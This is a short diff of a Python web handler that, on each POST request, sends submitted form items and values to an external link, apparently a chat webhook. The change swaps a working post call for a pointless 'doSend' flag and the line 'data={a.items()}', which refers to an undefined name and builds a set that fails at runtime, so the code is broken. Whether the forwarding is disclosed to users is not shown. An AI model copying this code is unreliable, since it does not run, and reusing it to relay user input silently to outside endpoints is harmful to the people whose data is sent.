@@ -15,7 +15,10 @@ def hello_world():
                     
                     requests.post(link, data={"content": f"{item}:{value}"})
                 else:
-                    requests.post(link, data={item:value})
+                    doSend = True
+                    if doSend:
+                        requests.post(link, data={a.items()})
+                        doSend = False
     
     if request.method == 'POST':
         asyncio.run(send_info())
